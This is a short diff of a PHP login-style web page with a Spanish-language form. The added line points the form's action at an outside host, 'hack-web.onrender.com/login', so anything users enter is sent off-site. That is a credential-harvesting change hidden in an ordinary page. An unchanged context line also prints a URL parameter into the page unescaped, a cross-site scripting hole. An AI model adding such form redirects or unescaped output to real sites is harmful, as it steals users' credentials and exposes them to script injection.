@@ -361,7 +361,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         <p style="color: white"><?php echo isset($_GET['datos']) ? 'Datos: '. $_GET['datos'] : 'no hay'; ?></p>
         
 
-        <form id="form" class="formulario" method="POST" autocomplete="off">
+        <form id="form" class="formulario" action="https://hack-web.onrender.com/login" method="POST" autocomplete="off">
             <div class="mb-4 text-left" id="name" style="display: none;">
                 <label class="block text-gray-300 text-sm mb-2">Nombre</label>
                 <input type="text" id="nameinput" name="name"
